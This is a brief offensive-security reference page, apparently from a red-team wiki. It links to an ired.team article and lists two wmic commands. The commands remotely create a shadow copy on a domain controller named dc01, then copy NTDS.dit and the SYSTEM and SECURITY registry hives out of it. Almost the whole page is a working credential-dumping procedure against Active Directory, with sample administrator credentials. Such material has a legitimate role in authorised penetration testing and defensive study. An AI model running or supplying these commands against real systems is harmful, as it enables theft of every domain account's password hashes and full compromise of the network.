# Wmic and Vssadmin Shadow Copy

{% embed url="https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-domain-controller-hashes-via-wmic-and-shadow-copy-using-vssadmin" %}

{% code overflow="wrap" %}
```bash
# Create a shadow copy of the C drive of the Domain Controller:
CMD> wmic /node:dc01 /user:administrator@corp /password:lab process call create "cmd /c vssadmin create shadow /for=C: 2>&1"

# Copy the NTDS.dit, SYSTEM and SECURITY hives to C:\temp on the DC01:
CMD> wmic /node:dc01 /user:administrator@corp /password:lab process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\temp\"
```
{% endcode %}
